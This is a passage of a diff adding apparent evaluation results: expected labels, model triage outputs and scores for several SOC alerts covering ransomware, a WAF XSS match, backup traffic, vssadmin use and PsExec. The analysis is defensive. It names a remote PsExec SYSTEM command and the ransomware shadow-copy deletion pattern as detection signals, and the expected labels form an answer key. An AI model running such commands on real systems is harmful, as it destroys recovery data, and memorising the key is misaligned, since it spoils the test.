+                "field": "host",
+                "value": "ws-finance-07",
+                "why": "Finance workstations hold sensitive data and often have access to network shares, so ransomware here could have a large impact. The alert does not show whether the host is still active on the network."
+              }
+            ],
+            "recommended_action": {
+              "type": "isolate_host",
+              "detail": "Isolate ws-finance-07 from the network now, then manually remove or quarantine C:\\Users\\Public\\invoice_2026.exe. Check for running processes from that file, signs of file encryption, and lateral movement to network shares. Find out how the file arrived (email or download) and hash it for a reputation check. Escalate to incident response if any encryption activity is found."
+            },
+            "needs_human_review": true,
+            "review_reasons": [
+              "Severity is Critical",
+              "Recommended action isolates a host"
+            ],
+            "meta": {
+              "provider": "claude",
+              "model": "claude-sonnet-5-5",
+              "prompt_version": "triage-v1",
+              "source": "live"
+            }
+          },
+          "score": {
+            "passes": {
+              "severity_exact": true,
+              "severity_within_1": true,
+              "classification": true,
+              "action": true,
+              "needs_human_review": true,
+              "required_fields": true
+            },
+            "missing_fields": []
+          }
+        },
+        {
+          "run": 3,
+          "ok": true,
+          "attempts": 1,
+          "result": {
+            "severity": "Critical",
+            "classification": "true_positive",
+            "confidence": "high",
+            "summary": "Antivirus flagged an executable on finance workstation ws-finance-07 as ransomware (Ransom.Generic.Encrypt), and the quarantine failed, so the file is still on disk and may be running. The file's location and name match common ransomware delivery patterns. The host should be isolated right away to prevent file encryption and lateral spread.",
+            "evidence": [
+              {
+                "field": "detection",
+                "value": "Ransom.Generic.Encrypt",
+                "why": "The signature names a ransomware family with encryption behavior. This points to malicious activity. A generic signature can sometimes misfire, but combined with the other indicators it is likely real."
+              },
+              {
+                "field": "action_taken",
+                "value": "quarantine_failed",
+                "why": "The malicious file was not contained and may still be executing or can be run, which raises urgency. Nothing here suggests the detection was benign or already remediated."
+              },
+              {
+                "field": "path",
+                "value": "C:\\Users\\Public\\invoice_2026.exe",
+                "why": "An executable posing as an invoice and sitting in the world-writable Public folder is a classic phishing or dropper pattern. No signal suggests it is a legitimate business application."
+              },
+              {
+                "field": "host",
+                "value": "ws-finance-07",
+                "why": "This is a finance workstation, which likely holds sensitive data and has access to network shares. The impact of encryption would be high and invoice-themed lures target this department."
+              }
+            ],
+            "recommended_action": {
+              "type": "isolate_host",
+              "detail": "Isolate ws-finance-07 from the network via EDR now, and keep it powered on to preserve memory. Then manually remove or capture invoice_2026.exe, check for running processes and encrypted files, identify the user and how the file arrived (email or download), and check for lateral movement or similar detections on other hosts. Escalate to incident response."
+            },
+            "needs_human_review": true,
+            "review_reasons": [
+              "Severity is Critical",
+              "Recommended action isolates a host"
+            ],
+            "meta": {
+              "provider": "claude",
+              "model": "claude-sonnet-5-5",
+              "prompt_version": "triage-v1",
+              "source": "live"
+            }
+          },
+          "score": {
+            "passes": {
+              "severity_exact": true,
+              "severity_within_1": true,
+              "classification": true,
+              "action": true,
+              "needs_human_review": true,
+              "required_fields": true
+            },
+            "missing_fields": []
+          }
+        }
+      ]
+    },
+    {
+      "id": "alert-006",
+      "expected": {
+        "severity": "Low",
+        "classification": "false_positive",
+        "action_type": "close",
+        "needs_human_review": false,
+        "must_cite_fields": [
+          "signature_status",
+          "process"
+        ]
+      },
+      "runs": [
+        {
+          "run": 1,
+          "ok": true,
+          "attempts": 1,
+          "result": {
+            "severity": "Low",
+            "classification": "false_positive",
+            "confidence": "medium",
+            "summary": "A browser updater running from its normal install directory modified a system file, and its signature is valid with a known vendor signer. This looks like routine update behavior, but the alert does not say which system file changed, so that detail is worth a quick check before closing.",
+            "evidence": [
+              {
+                "field": "signature_status",
+                "value": "valid",
+                "why": "A valid code signature points to benign activity because the binary is unmodified and was signed by its publisher."
+              },
+              {
+                "field": "path",
+                "value": "C:\\Program Files\\ExampleBrowser\\Application\\updater.exe",
+                "why": "The process runs from the browser's standard install location, which fits a legitimate updater and not a dropped or masqueraded binary."
+              },
+              {
+                "field": "signer",
+                "value": "Example Software Inc.",
+                "why": "The signer matches the product name, supporting a legitimate vendor updater."
+              },
+              {
+                "field": "action",
+                "value": "modified system file",
+                "why": "Modifying a system file is the only suspicious signal, since it could indicate tampering or abuse of a trusted signed binary. The alert does not name the file, so this cannot be ruled out."
+              }
+            ],
+            "recommended_action": {
+              "type": "close",
+              "detail": "Check that the modified system file is consistent with a browser update, such as a file in the browser's own directory or a standard updater task. Also confirm that the updater's version and hash match the vendor's release. If both check out, close as a false positive. If the file is an unrelated OS component, escalate instead."
+            },
+            "needs_human_review": false,
+            "review_reasons": [],
+            "meta": {
+              "provider": "claude",
+              "model": "claude-sonnet-5-5",
+              "prompt_version": "triage-v1",
+              "source": "live"
+            }
+          },
+          "score": {
+            "passes": {
+              "severity_exact": true,
+              "severity_within_1": true,
+              "classification": true,
+              "action": true,
+              "needs_human_review": true,
+              "required_fields": false
+            },
+            "missing_fields": [
+              "process"
+            ]
+          }
+        },
+        {
+          "run": 2,
+          "ok": true,
+          "attempts": 1,
+          "result": {
+            "severity": "Low",
+            "classification": "false_positive",
+            "confidence": "medium",
+            "summary": "A browser updater running from its normal install directory with a valid signature from the expected vendor modified a system file. This most likely matches a routine browser update. The alert does not say which file was changed, so that detail should be checked before closing.",
+            "evidence": [
+              {
+                "field": "signature_status",
+                "value": "valid",
+                "why": "A valid code signature indicates the binary has not been tampered with and points to benign activity."
+              },
+              {
+                "field": "signer",
+                "value": "Example Software Inc.",
+                "why": "The signer matches the browser vendor implied by the install path, which supports a legitimate updater."
+              },
+              {
+                "field": "path",
+                "value": "C:\\Program Files\\ExampleBrowser\\Application\\updater.exe",
+                "why": "The process runs from the vendor's expected Program Files directory, which is consistent with a legitimate install and not a dropped or masqueraded binary."
+              },
+              {
+                "field": "action",
+                "value": "modified system file",
+                "why": "Modification of a system file is the suspicious signal and could indicate abuse of a trusted binary, but updaters commonly change files as part of normal updates. The alert does not name the file, so it cannot be ruled out."
+              }
+            ],
+            "recommended_action": {
+              "type": "close",
+              "detail": "Before closing, confirm the modified file path and check that the change matches a scheduled or recent ExampleBrowser update. Verify the updater.exe hash against the vendor's known-good version. If the modified file is outside the browser's directories or the hash does not match, reopen and escalate."
+            },
+            "needs_human_review": false,
+            "review_reasons": [],
+            "meta": {
+              "provider": "claude",
+              "model": "claude-sonnet-5-5",
+              "prompt_version": "triage-v1",
+              "source": "live"
+            }
+          },
+          "score": {
+            "passes": {
+              "severity_exact": true,
+              "severity_within_1": true,
+              "classification": true,
+              "action": true,
+              "needs_human_review": true,
+              "required_fields": false
+            },
+            "missing_fields": [
+              "process"
+            ]
+          }
+        },
+        {
+          "run": 3,
+          "ok": true,
+          "attempts": 1,
+          "result": {
+            "severity": "Low",
+            "classification": "false_positive",
+            "confidence": "medium",
+            "summary": "A browser updater running from its normal install directory with a valid signature from the expected vendor modified a system file. This is consistent with routine update behavior, but the alert does not say which file was changed, so that detail should be checked before closing.",
+            "evidence": [
+              {
+                "field": "signature_status",
+                "value": "valid",
+                "why": "A valid code signature supports that the binary is genuine and unmodified, which points to benign activity."
+              },
+              {
+                "field": "signer",
+                "value": "Example Software Inc.",
+                "why": "The signer matches the browser vendor implied by the install path, which supports legitimate updater behavior."
+              },
+              {
+                "field": "path",
+                "value": "C:\\Program Files\\ExampleBrowser\\Application\\updater.exe",
+                "why": "The process runs from the vendor's own Program Files directory, a protected location, which is consistent with a legitimate updater."
+              },
+              {
+                "field": "action",
+                "value": "modified system file",
+                "why": "Modifying a system file is a potentially malicious behavior (tampering or persistence), and the alert does not name the file. This is why confidence is not high."
+              }
+            ],
+            "recommended_action": {
+              "type": "close",
+              "detail": "Check which system file was modified and whether the change matches a scheduled or recent browser update. If it was a browser component or an expected update artifact, close as a false positive. If the file is an unrelated OS file, escalate to L2."
+            },
+            "needs_human_review": false,
+            "review_reasons": [],
+            "meta": {
+              "provider": "claude",
+              "model": "claude-sonnet-5-5",
+              "prompt_version": "triage-v1",
+              "source": "live"
+            }
+          },
+          "score": {
+            "passes": {
+              "severity_exact": true,
+              "severity_within_1": true,
+              "classification": true,
+              "action": true,
+              "needs_human_review": true,
+              "required_fields": false
+            },
+            "missing_fields": [
+              "process"
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "id": "alert-007",
+      "expected": {
+        "severity": "Low",
+        "classification": "false_positive",
+        "action_type": "close",
+        "needs_human_review": false,
+        "must_cite_fields": [
+          "uri",
+          "referer"
+        ]
+      },
+      "runs": [
+        {
+          "run": 1,
+          "ok": true,
+          "attempts": 1,
+          "result": {
+            "severity": "Low",
+            "classification": "false_positive",
+            "confidence": "high",
+            "summary": "The WAF blocked a documentation search whose query was a plain-language question about escaping script tags in templates. The request came from an internal IP via the site's own search page, and there is no exploit payload or attack pattern. This looks like a benign keyword match on the encoded script tag text.",
+            "evidence": [
+              {
+                "field": "uri",
+                "value": "/docs/search?q=how+to+escape+%3Cscript%3E+tags+in+templates",
+                "why": "The query is a natural-language question that only mentions an encoded script tag as a topic. It contains no event handlers, JavaScript, or exfiltration code. This points to benign activity, and the encoded script tag is the only thing that would trigger xss-001."
+              },
+              {
+                "field": "rule_id",
+                "value": "xss-001",
+                "why": "A generic XSS signature probably matched the literal script tag string. This is the only malicious-leaning signal, and it is a pattern match rather than evidence of exploitation."
+              },
+              {
+                "field": "source_ip",
+                "value": "10.20.4.17",
+                "why": "This is an RFC1918 internal address, so the request is not from an external attacker. That is consistent with a user searching internal docs, though internal hosts can still be compromised."
+              },
+              {
+                "field": "referer",
+                "value": "https://docs.example.com/search",
+                "why": "The request came from the documentation site's own search page, which fits normal user behavior and not a crafted or scripted attack."
+              },
+              {
+                "field": "status_code",
+                "value": "403",
+                "why": "The WAF blocked the request, so even if it were malicious it did not reach the application. The impact is a false-positive block of a legitimate user."
+              }
+            ],
+            "recommended_action": {
+              "type": "close",
+              "detail": "Close as a false positive. Optionally ask the WAF owner to tune xss-001 for the /docs/search endpoint, for example by excluding the q parameter or requiring a more specific payload pattern, so legitimate documentation searches about script tags are not blocked."
+            },
+            "needs_human_review": false,
+            "review_reasons": [],
+            "meta": {
+              "provider": "claude",
+              "model": "claude-sonnet-5-5",
+              "prompt_version": "triage-v1",
+              "source": "live"
+            }
+          },
+          "score": {
+            "passes": {
+              "severity_exact": true,
+              "severity_within_1": true,
+              "classification": true,
+              "action": true,
+              "needs_human_review": true,
+              "required_fields": true
+            },
+            "missing_fields": []
+          }
+        },
+        {
+          "run": 2,
+          "ok": true,
+          "attempts": 1,
+          "result": {
+            "severity": "Low",
+            "classification": "false_positive",
+            "confidence": "high",
+            "summary": "The WAF blocked a GET request to the documentation search because the query contained an encoded script tag. The query text is a plain-language question about escaping script tags in templates, not an exploit attempt. The request came from an internal IP and from the docs search page itself, so this looks like a legitimate user triggering a noisy XSS rule.",
+            "evidence": [
+              {
+                "field": "uri",
+                "value": "/docs/search?q=how+to+escape+%3Cscript%3E+tags+in+templates",
+                "why": "The query is a natural-language question with a URL-encoded <script> tag as a topic. It has no event handlers, JavaScript payload, or closing tag and attempts no code execution, which points to benign activity. The literal <script> string is what plausibly tripped the rule."
+              },
+              {
+                "field": "rule_id",
+                "value": "xss-001",
+                "why": "The XSS rule matched on the <script> token. This is the only malicious-leaning signal, and it is a pattern match likely to fire on legitimate documentation searches."
+              },
+              {
+                "field": "source_ip",
+                "value": "10.20.4.17",
+                "why": "This is an RFC1918 internal address, so it is not an external attacker. That makes a developer or employee searching the docs more likely."
+              },
+              {
+                "field": "referer",
+                "value": "https://docs.example.com/search",
+                "why": "The request came from the site's own search page, consistent with a normal user search and not a crafted external link."
+              },
+              {
+                "field": "status_code",
+                "value": "403",
+                "why": "The WAF blocked the request, so nothing reached the application. Even if it were malicious, there was no impact."
+              }
+            ],
+            "recommended_action": {
+              "type": "close",
+              "detail": "Close as a false positive. Optionally ask the WAF owner to tune xss-001 for the /docs/search endpoint, for example by allowing encoded script tags in the q parameter of GET requests, and check whether 10.20.4.17 produces repeated or varied XSS payloads."
+            },
+            "needs_human_review": false,
+            "review_reasons": [],
+            "meta": {
+              "provider": "claude",
+              "model": "claude-sonnet-5-5",
+              "prompt_version": "triage-v1",
+              "source": "live"
+            }
+          },
+          "score": {
+            "passes": {
+              "severity_exact": true,
+              "severity_within_1": true,
+              "classification": true,
+              "action": true,
+              "needs_human_review": true,
+              "required_fields": true
+            },
+            "missing_fields": []
+          }
+        },
+        {
+          "run": 3,
+          "ok": true,
+          "attempts": 1,
+          "result": {
+            "severity": "Low",
+            "classification": "false_positive",
+            "confidence": "high",
+            "summary": "The WAF blocked a documentation search whose query was a plain-language question about escaping script tags in templates. The request came from an internal IP via the site's own search page, and it contains no executable payload or attack pattern. This is a rule over-match on a benign search term.",
+            "evidence": [
+              {
+                "field": "uri",
+                "value": "/docs/search?q=how+to+escape+%3Cscript%3E+tags+in+templates",
+                "why": "The encoded <script> is part of a natural-language question, with no event handlers, JavaScript payload, or injection syntax. This matches the keyword-based trigger behind xss-001, so it points to benign activity."
+              },
+              {
+                "field": "referer",
+                "value": "https://docs.example.com/search",
+                "why": "The request came from the legitimate docs search page, consistent with a user typing a query rather than crafted exploit traffic."
+              },
+              {
+                "field": "source_ip",
+                "value": "10.20.4.17",
+                "why": "This is an RFC1918 internal address, so it is not an external scanner. An internal source is not proof of safety, but there is no sign of repeated probing here."
+              },
+              {
+                "field": "rule_id",
+                "value": "xss-001",
+                "why": "The XSS rule fired on the literal <script> string, which is the only malicious-looking signal and is outweighed by the benign context."
+              },
+              {
+                "field": "status_code",
+                "value": "403",
+                "why": "The request was blocked, so no payload reached the application. The user's legitimate search also failed, which is a usability impact worth fixing."
+              }
+            ],
+            "recommended_action": {
+              "type": "close",
+              "detail": "Close as a false positive. Optionally ask the WAF owner to tune xss-001 for /docs/search, for example by scoping the rule or adding an exception for the q parameter, so legitimate searches about script tags are not blocked."
+            },
+            "needs_human_review": false,
+            "review_reasons": [],
+            "meta": {
+              "provider": "claude",
+              "model": "claude-sonnet-5-5",
+              "prompt_version": "triage-v1",
+              "source": "live"
+            }
+          },
+          "score": {
+            "passes": {
+              "severity_exact": true,
+              "severity_within_1": true,
+              "classification": true,
+              "action": true,
+              "needs_human_review": true,
+              "required_fields": true
+            },
+            "missing_fields": []
+          }
+        }
+      ]
+    },
+    {
+      "id": "alert-008",
+      "expected": {
+        "severity": "Low",
+        "classification": "false_positive",
+        "action_type": "close",
+        "needs_human_review": false,
+        "must_cite_fields": [
+          "dest_host",
+          "schedule"
+        ]
+      },
+      "runs": [
+        {
+          "run": 1,
+          "ok": true,
+          "attempts": 1,
+          "result": {
+            "severity": "Low",
+            "classification": "false_positive",
+            "confidence": "medium",
+            "summary": "A large outbound transfer (~52 GB) from fs-backup-01 to backup.example.com occurred at 02:05, within a nightly 02:00 backup window, and the destination is marked approved. The activity looks like a routine scheduled backup, though the approval flag and size are not independently verified in the alert.",
+            "evidence": [
+              {
+                "field": "schedule",
+                "value": "nightly 02:00",
+                "why": "The transfer began just after the scheduled nightly backup time (alert at 02:05Z), which supports benign scheduled activity."
+              },
+              {
+                "field": "destination_approved",
+                "value": "true",
+                "why": "The destination is flagged as an approved backup target, pointing to benign activity."
+              },
+              {
+                "field": "src_host",
+                "value": "fs-backup-01",
+                "why": "The source is a host named for backup duties, consistent with the expected role of sending backup data."
+              },
+              {
+                "field": "bytes_out",
+                "value": "52428800000",
+                "why": "About 52 GB outbound is a large volume that would normally warrant attention as possible exfiltration, so it should be checked against the usual nightly backup size."
+              },
+              {
+                "field": "dest_ip",
+                "value": "198.51.100.40",
+                "why": "The destination is an external IP; it should be confirmed that it matches the known address for backup.example.com to rule out spoofing or redirection."
+              }
+            ],
+            "recommended_action": {
+              "type": "close",
+              "detail": "Close as expected backup activity after a quick check that bytes_out is in line with previous nightly backup volumes and that 198.51.100.40 matches the known address for backup.example.com. If either check fails, reopen and escalate."
+            },
+            "needs_human_review": false,
+            "review_reasons": [],
+            "meta": {
+              "provider": "claude",
+              "model": "claude-sonnet-5-5",
+              "prompt_version": "triage-v1",
+              "source": "live"
+            }
+          },
+          "score": {
+            "passes": {
+              "severity_exact": true,
+              "severity_within_1": true,
+              "classification": true,
+              "action": true,
+              "needs_human_review": true,
+              "required_fields": false
+            },
+            "missing_fields": [
+              "dest_host"
+            ]
+          }
+        },
+        {
+          "run": 2,
+          "ok": true,
+          "attempts": 1,
+          "result": {
+            "severity": "Low",
+            "classification": "false_positive",
+            "confidence": "medium",
+            "summary": "A 52 GB outbound transfer from fs-backup-01 to backup.example.com started at about 02:05, which fits the nightly 02:00 backup schedule, and the destination is marked as approved. The volume is large and happens off-hours, which would normally be a data exfiltration signal. However, the schedule and approved destination explain it, so it is most likely routine backup traffic.",
+            "evidence": [
+              {
+                "field": "schedule",
+                "value": "nightly 02:00",
+                "why": "The alert time of 02:05 falls right after the scheduled backup window, so the transfer is expected."
+              },
+              {
+                "field": "destination_approved",
+                "value": "true",
+                "why": "The destination is on the approved list, which lowers the chance of exfiltration to an unknown external party."
+              },
+              {
+                "field": "dest_host",
+                "value": "backup.example.com",
+                "why": "The destination hostname is a backup service in the organization's own domain, consistent with the source host's role."
+              },
+              {
+                "field": "src_host",
+                "value": "fs-backup-01",
+                "why": "The source is a backup file server, so sending large volumes is its normal job."
+              },
+              {
+                "field": "bytes_out",
+                "value": "52428800000",
+                "why": "About 52 GB is a large volume and the only malicious-leaning signal. The alert has no baseline, so a size anomaly cannot be ruled out."
+              }
+            ],
+            "recommended_action": {
+              "type": "close",
+              "detail": "Close as expected backup activity after a quick check that 52 GB is within the normal nightly volume for fs-backup-01. If the volume is well above the usual baseline, or dest_ip 198.51.100.40 does not match the approved backup.example.com address, reopen and escalate."
+            },
+            "needs_human_review": false,
+            "review_reasons": [],
+            "meta": {
+              "provider": "claude",
+              "model": "claude-sonnet-5-5",
+              "prompt_version": "triage-v1",
+              "source": "live"
+            }
+          },
+          "score": {
+            "passes": {
+              "severity_exact": true,
+              "severity_within_1": true,
+              "classification": true,
+              "action": true,
+              "needs_human_review": true,
+              "required_fields": true
+            },
+            "missing_fields": []
+          }
+        },
+        {
+          "run": 3,
+          "ok": true,
+          "attempts": 1,
+          "result": {
+            "severity": "Low",
+            "classification": "false_positive",
+            "confidence": "medium",
+            "summary": "A large outbound transfer (~52 GB) from fs-backup-01 to backup.example.com matches the nightly 02:00 backup schedule and an approved destination. The only unusual element is the volume, which cannot be compared to a baseline from this alert alone. Likely routine backup traffic, but analyst should confirm size is within normal range.",
+            "evidence": [
+              {
+                "field": "schedule",
+                "value": "nightly 02:00",
+                "why": "Alert timestamp (02:05Z) falls just after the scheduled start, consistent with a routine backup job (benign)."
+              },
+              {
+                "field": "destination_approved",
+                "value": "true",
+                "why": "Destination is on the approved list, which points to legitimate backup activity (benign)."
+              },
+              {
+                "field": "dest_host",
+                "value": "backup.example.com",
+                "why": "Hostname is a backup service and matches the source host's role (fs-backup-01) (benign)."
+              },
+              {
+                "field": "bytes_out",
+                "value": "52428800000",
+                "why": "About 52 GB outbound is a large volume and could indicate exfiltration if it exceeds the normal nightly baseline (potentially malicious)."
+              },
+              {
+                "field": "dest_ip",
+                "value": "198.51.100.40",
+                "why": "IP should be verified as resolving to the approved backup.example.com; a mismatch would suggest redirection or spoofing (potentially malicious, unverified)."
+              }
+            ],
+            "recommended_action": {
+              "type": "monitor",
+              "detail": "Compare the 52 GB transfer against previous nightly backup volumes for fs-backup-01 and confirm 198.51.100.40 resolves to backup.example.com. Close as expected backup traffic if both match; escalate if volume is significantly above baseline or the IP mismatches."
+            },
+            "needs_human_review": false,
+            "review_reasons": [],
+            "meta": {
+              "provider": "claude",
+              "model": "claude-sonnet-5-5",
+              "prompt_version": "triage-v1",
+              "source": "live"
+            }
+          },
+          "score": {
+            "passes": {
+              "severity_exact": true,
+              "severity_within_1": true,
+              "classification": true,
+              "action": false,
+              "needs_human_review": true,
+              "required_fields": true
+            },
+            "missing_fields": []
+          }
+        }
+      ]
+    },
+    {
+      "id": "alert-009",
+      "expected": {
+        "severity": "Low",
+        "classification": "false_positive",
+        "action_type": "close",
+        "needs_human_review": false,
+        "must_cite_fields": [
+          "command_line",
+          "parent_process"
+        ]
+      },
+      "runs": [
+        {
+          "run": 1,
+          "ok": true,
+          "attempts": 1,
+          "result": {
+            "severity": "Low",
+            "classification": "false_positive",
+            "confidence": "medium",
+            "summary": "The EDR flagged 'vssadmin list shadows', which only lists existing shadow copies and does not delete or alter them. It was launched by backup-agent.exe under the svc-backup service account on a file server, which fits routine backup activity. Because the alert shows no destructive action, this is likely benign, but the backup agent and the timing should be verified.",
+            "evidence": [
+              {
+                "field": "command_line",
+                "value": "vssadmin list shadows",
+                "why": "Read-only enumeration of shadow copies. Ransomware typically runs 'delete shadows' or resize commands, so this is not destructive, though listing can be reconnaissance before deletion."
+              },
+              {
+                "field": "parent_process",
+                "value": "backup-agent.exe",
+                "why": "A backup agent is an expected parent for VSS queries, supporting benign activity. If the agent binary were tampered with or impersonated, this would be a malicious signal."
+              },
+              {
+                "field": "user",
+                "value": "svc-backup",
+                "why": "A dedicated backup service account matches the expected context. Misuse of a service account would be a risk, but nothing here indicates it."
+              },
+              {
+                "field": "signature_status",
+                "value": "valid",
+                "why": "A valid signature indicates vssadmin.exe is the legitimate Microsoft binary, not a masquerading copy."
+              },
+              {
+                "field": "host",
+                "value": "srv-file-02",
+                "why": "A file server is a plausible place for backup jobs, but it is also a high-value ransomware target, so a check of nearby activity on this host is worthwhile."
+              }
+            ],
+            "recommended_action": {
+              "type": "close",
+              "detail": "Confirm that backup-agent.exe is the approved backup software on srv-file-02 and that a 01:30 UTC job is scheduled. Check the host for any 'vssadmin delete shadows' or similar commands around the same time. If both checks are clean, close as benign and consider tuning the rule for this parent/user combination."
+            },
+            "needs_human_review": false,
+            "review_reasons": [],
+            "meta": {
+              "provider": "claude",
+              "model": "claude-sonnet-5-5",
+              "prompt_version": "triage-v1",
+              "source": "live"
+            }
+          },
+          "score": {
+            "passes": {
+              "severity_exact": true,
+              "severity_within_1": true,
+              "classification": true,
+              "action": true,
+              "needs_human_review": true,
+              "required_fields": true
+            },
+            "missing_fields": []
+          }
+        },
+        {
+          "run": 2,
+          "ok": true,
+          "attempts": 1,
+          "result": {
+            "severity": "Low",
+            "classification": "false_positive",
+            "confidence": "medium",
+            "summary": "vssadmin.exe ran 'list shadows', a read-only enumeration of shadow copies, spawned by backup-agent.exe under the svc-backup service account on a file server. This fits routine backup agent behavior and does not delete or modify shadow copies, though the 01:30 UTC timing and use of a service account warrant a quick baseline check.",
+            "evidence": [
+              {
+                "field": "command_line",
+                "value": "vssadmin list shadows",
+                "why": "Read-only listing command. Ransomware typically uses 'delete shadows' or resize operations, so there is no destructive intent here, though listing can also be attacker reconnaissance."
+              },
+              {
+                "field": "parent_process",
+                "value": "backup-agent.exe",
+                "why": "The parent is a backup agent, which commonly enumerates shadow copies as part of normal operation. This supports benign activity, but the parent binary's legitimacy is not confirmed in the payload."
+              },
+              {
+                "field": "user",
+                "value": "svc-backup",
+                "why": "A dedicated backup service account matches the expected context. If this account were compromised, it could be abused, so it is a minor residual risk."
+              },
+              {
+                "field": "signature_status",
+                "value": "valid",
+                "why": "vssadmin.exe has a valid signature, indicating it is the genuine Windows binary and not a masquerading file. Attackers can still abuse legitimate living-off-the-land tools."
+              },
+              {
+                "field": "host",
+                "value": "srv-file-02",
+                "why": "A file server is a plausible place for backup and shadow copy activity, but also a high-value ransomware target, so any follow-on shadow copy deletion here would be significant."
+              }
+            ],
+            "recommended_action": {
+              "type": "close",
+              "detail": "Close as expected backup activity after confirming that backup-agent.exe runs scheduled jobs on srv-file-02 around 01:30 UTC and that svc-backup normally runs this command. If it is not in the baseline, reopen and check for vssadmin delete/resize commands or unusual svc-backup logons on srv-file-02."
+            },
+            "needs_human_review": false,
+            "review_reasons": [],
+            "meta": {
+              "provider": "claude",
+              "model": "claude-sonnet-5-5",
+              "prompt_version": "triage-v1",
+              "source": "live"
+            }
+          },
+          "score": {
+            "passes": {
+              "severity_exact": true,
+              "severity_within_1": true,
+              "classification": true,
+              "action": true,
+              "needs_human_review": true,
+              "required_fields": true
+            },
+            "missing_fields": []
+          }
+        },
+        {
+          "run": 3,
+          "ok": true,
+          "attempts": 1,
+          "result": {
+            "severity": "Low",
+            "classification": "false_positive",
+            "confidence": "medium",
+            "summary": "vssadmin.exe ran 'list shadows', which only enumerates shadow copies and does not delete them. It was launched by backup-agent.exe under the svc-backup service account on a file server, which looks like routine backup activity. The 01:30 UTC timing and the fact that shadow copy enumeration is also used in ransomware recon leave a small chance of misuse, so a quick check is worthwhile.",
+            "evidence": [
+              {
+                "field": "command_line",
+                "value": "vssadmin list shadows",
+                "why": "This is a read-only enumeration command. It is not the destructive 'delete shadows' used by ransomware, which points to benign activity."
+              },
+              {
+                "field": "parent_process",
+                "value": "backup-agent.exe",
+                "why": "A backup agent launching vssadmin is expected for backup jobs and supports a benign verdict."
+              },
+              {
+                "field": "user",
+                "value": "svc-backup",
+                "why": "A dedicated backup service account matches the expected context for this activity, which favors benign."
+              },
+              {
+                "field": "signature_status",
+                "value": "valid",
+                "why": "The binary is validly signed, so it is the genuine Windows tool and not a masqueraded one. This is benign-leaning, though attackers also abuse legitimate signed tools."
+              },
+              {
+                "field": "host",
+                "value": "srv-file-02",
+                "why": "File servers are high-value ransomware targets, so shadow copy enumeration here deserves some caution. This is a mild malicious-leaning signal if the account or agent were compromised."
+              }
+            ],
+            "recommended_action": {
+              "type": "close",
+              "detail": "Close as expected backup behavior after confirming that svc-backup and backup-agent.exe regularly run 'vssadmin list shadows' on srv-file-02 around 01:30 UTC. If this is not a normal pattern, or if 'delete shadows' or other unusual commands from this account appear, reopen and escalate."
+            },
+            "needs_human_review": false,
+            "review_reasons": [],
+            "meta": {
+              "provider": "claude",
+              "model": "claude-sonnet-5-5",
+              "prompt_version": "triage-v1",
+              "source": "live"
+            }
+          },
+          "score": {
+            "passes": {
+              "severity_exact": true,
+              "severity_within_1": true,
+              "classification": true,
+              "action": true,
+              "needs_human_review": true,
+              "required_fields": true
+            },
+            "missing_fields": []
+          }
+        }
+      ]
+    },
+    {
+      "id": "alert-010",
+      "expected": {
+        "severity": "Medium",
+        "classification": "needs_investigation",
+        "action_type": "escalate",
+        "needs_human_review": true,
+        "must_cite_fields": [
+          "in_maintenance_window",
+          "account_on_change_ticket"
+        ]
+      },
+      "runs": [
+        {
+          "run": 1,
+          "ok": true,
+          "attempts": 1,
+          "result": {
+            "severity": "Medium",
+            "classification": "needs_investigation",
+            "confidence": "medium",
+            "summary": "PsExec was run from the IT jump host it-jump-01 against srv-app-04 using SYSTEM (-s) to run a benign recon command (ipconfig /all) during a maintenance window. The account adm-user3 is not on any change ticket, so the activity may be unauthorized lateral movement or admin discovery. The signals conflict and the analyst needs to confirm intent with the account owner.",
+            "evidence": [
+              {
+                "field": "in_maintenance_window",
+                "value": "true",
+                "why": "Activity occurred during an approved maintenance window, which supports legitimate admin work."
+              },
+              {
+                "field": "source_host",
+                "value": "it-jump-01",
+                "why": "The origin is a known IT jump host, the expected place for admin tooling like PsExec, which leans benign."
+              },
+              {
+                "field": "account_on_change_ticket",
+                "value": "false",
+                "why": "The account is not tied to any change ticket, so the activity is not authorized by change control, which leans malicious or policy-violating."
+              },
+              {
+                "field": "command_line",
+                "value": "psexec \\\\srv-app-04 -s cmd.exe /c ipconfig /all",
+                "why": "Remote execution as SYSTEM (-s) with network discovery commands is a common lateral movement and recon pattern, though the command itself is low impact."
+              },
+              {
+                "field": "account",
+                "value": "adm-user3",
+                "why": "An admin account is being used for remote execution. Verify with the owner that they ran this and that the credentials were not compromised."
+              }
+            ],
+            "recommended_action": {
+              "type": "escalate",
+              "detail": "Contact adm-user3 and the IT change owner to confirm they ran PsExec against srv-app-04 and why no ticket exists. Review EDR and authentication logs for other activity from adm-user3 and it-jump-01 around this time, and check srv-app-04 for follow-on commands. If the activity is not confirmed, reset adm-user3 credentials and treat it as lateral movement."
+            },
+            "needs_human_review": true,
+            "review_reasons": [
+              "Classification is needs_investigation"
+            ],
+            "meta": {
+              "provider": "claude",
+              "model": "claude-sonnet-5-5",
+              "prompt_version": "triage-v1",
+              "source": "live"
+            }
+          },
+          "score": {
+            "passes": {
+              "severity_exact": true,
+              "severity_within_1": true,
+              "classification": true,
+              "action": true,
+              "needs_human_review": true,
+              "required_fields": true
+            },
+            "missing_fields": []
+          }
+        },
+        {
+          "run": 2,
+          "ok": true,
+          "attempts": 1,
+          "result": {
+            "severity": "Medium",
+            "classification": "needs_investigation",
+            "confidence": "medium",
+            "summary": "PsExec was run from the IT jump host to srv-app-04 as SYSTEM, running only a benign recon command (ipconfig /all), during a maintenance window. However, the account adm-user3 is not on any change ticket, so the activity may be unauthorized or an early lateral movement step. Cannot be confirmed as benign without verifying with the account owner and change owner.",
+            "evidence": [
+              {
+                "field": "in_maintenance_window",
+                "value": "true",
+                "why": "Activity occurred during an approved maintenance window and from an IT jump host, which supports legitimate admin work."
+              },
+              {
+                "field": "source_host",
+                "value": "it-jump-01",
+                "why": "Origin is a designated IT jump host, where admin tool use such as PsExec is expected, which leans benign."
+              },
+              {
+                "field": "account_on_change_ticket",
+                "value": "false",
+                "why": "The account is not listed on a change ticket, so the activity is not tied to authorized work and could be misuse of a privileged account."
+              },
+              {
+                "field": "command_line",
+                "value": "psexec \\\\srv-app-04 -s cmd.exe /c ipconfig /all",
+                "why": "The -s flag runs as SYSTEM on a remote server, and ipconfig /all is a common post-compromise discovery command, though the command itself is low impact."
+              },
+              {
+                "field": "account",
+                "value": "adm-user3",
+                "why": "A privileged admin account is performing remote execution, so its legitimacy needs to be confirmed with the owner."
+              }
+            ],
+            "recommended_action": {
+              "type": "escalate",
